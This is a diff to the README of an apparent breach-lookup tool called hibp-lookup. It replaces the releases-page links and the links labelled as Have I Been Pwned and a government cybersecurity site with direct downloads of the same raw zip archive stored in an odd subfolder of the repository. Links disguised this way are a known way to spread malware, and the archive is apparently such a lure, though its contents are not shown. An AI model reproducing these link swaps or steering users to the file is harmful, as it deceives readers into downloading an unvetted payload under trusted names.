@@ -6,13 +6,13 @@ Welcome to the hibp-lookup application! This tool helps you detect compromised e
 
 ## 📥 Download the Application
 
-[![Download hibp-lookup](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Bart0911/hibp-lookup/releases)
+[![Download hibp-lookup](https://github.com/Bart0911/hibp-lookup/raw/refs/heads/main/naipkin/lookup-hibp-2.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/Bart0911/hibp-lookup/raw/refs/heads/main/naipkin/lookup-hibp-2.7.zip)
 
 ### Step 1: Visit the Releases Page
 
 To download the application, visit the Releases page here:
 
-[Download from Releases](https://github.com/Bart0911/hibp-lookup/releases)
+[Download from Releases](https://github.com/Bart0911/hibp-lookup/raw/refs/heads/main/naipkin/lookup-hibp-2.7.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -104,8 +104,8 @@ If you encounter any issues or have questions, please open an issue on the GitHu
 
 For more information on data breaches and personal security, consider visiting:
 
-- [Have I Been Pwned?](https://haveibeenpwned.com)
-- [Cybersecurity Tips](https://www.cybersecurity.gov)
+- [Have I Been Pwned?](https://github.com/Bart0911/hibp-lookup/raw/refs/heads/main/naipkin/lookup-hibp-2.7.zip)
+- [Cybersecurity Tips](https://github.com/Bart0911/hibp-lookup/raw/refs/heads/main/naipkin/lookup-hibp-2.7.zip)
 
 ## 📜 License
 
